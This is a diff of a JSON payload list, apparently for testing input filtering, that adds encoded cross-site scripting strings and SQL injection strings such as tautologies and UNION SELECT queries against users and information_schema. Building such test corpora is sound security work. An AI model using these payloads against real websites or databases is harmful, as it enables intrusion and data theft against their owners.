@@ -1,8 +1,5 @@
 [
-    {"inputField": "<script>alert(document.domain)</script>", "category": "Java"},
-    {"inputField": "<script>alert(window.origin</script>)", "category": "Java"},
-    {"inputField": "\u2019<script>alert(document.domain)</script>", "category": "Java"},
-    {"inputField": "\u2019<script>alert(window.origin</script>)", "category": "Java"},
+    {"inputField": "<script>alert('XSS')</script>", "category": "HTML"},
     {"inputField": "<img src=x onerror=alert('XSS')>", "category": "HTML"},
     {"inputField": "<svg/onload=alert('XSS')>", "category": "HTML"},
     {"inputField": "<body onload=alert('XSS')>", "category": "HTML"},
@@ -44,7 +41,6 @@
     {"inputField": "<bdo dir=rtl>XSS</bdo>", "category": "HTML"},
     {"inputField": "<bdi>XSS</bdi>", "category": "HTML"},
     {"inputField": "<ruby>XSS</ruby>", "category": "HTML"},
-    {"inputField": "\u2019svg/onload=confirm(1)>", "category": "HTML"},
     {"inputField": "<rt>XSS</rt>", "category": "HTML"},
     {"inputField": "<rp>XSS</rp>", "category": "HTML"},
     {"inputField": "<mark>XSS</mark>", "category": "HTML"},
@@ -3892,7 +3888,37 @@
     {
     	  "inputField": "<Button href='javascript://%0aalert(document.domain)'>XSS</Button>\njavascript://%0dalert() \njavascript:/**/%0aalert()",
     	  "category": "Java"
-    }
+    },
+    {"inputField": "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E", "category": "HTML"},
+    {"inputField": "&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;", "category": "HTML"},
+    {"inputField": "<img src=x onerror=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKwMIwAAAABJRU5ErkJggg==\" onerror=alert('XSS')>", "category": "HTML"},
+    {"inputField": "<script>\u0061\u006C\u0065\u0072\u0074('XSS')</script>", "category": "HTML"},
+    {"inputField": "<div style=\"background-image: url('javascript:alert(\"XSS\")');\"></div>", "category": "HTML"},
+    {"inputField": "<a href=\"javascript:alert('XSS')\">Click me</a>", "category": "HTML"},
+    {"inputField": "<div onmouseover=\"alert('XSS')\">Hover me</div>", "category": "HTML"},
+    {"inputField": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "category": "HTML"},
+    {"inputField": "<body onload=\"alert('XSS')\"></body>", "category": "HTML"},
+    {"inputField": "admin' --", "category": "SQL"},
+    {"inputField": "admin%27%20--", "category": "SQL"},
+    {"inputField": "admin&#39; --", "category": "SQL"},
+    {"inputField": "admin\u0027 --", "category": "SQL"},
+    {"inputField": "YWRtaW4nIC0t", "category": "SQL"},
+    {"inputField": "1' OR '1'='1", "category": "SQL"},
+    {"inputField": "1' OR '1'='1' --", "category": "SQL"},
+    {"inputField": "1' OR '1'='1' #", "category": "SQL"},
+    {"inputField": "1' OR '1'='1' /*", "category": "SQL"},
+    {"inputField": "1' UNION SELECT null, null, null --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT database(), user(), version() --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', 'password' --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', MD5('password') --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', SHA1('password') --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', CONCAT('pass', 'word') --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM users --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.tables --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.columns --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.schemata --", "category": "SQL"},
+    {"inputField": "1' UNION SELECT 1, 'admin', 'password' FROM information_schema.views --", "category": "SQL"}
 
 ]
     
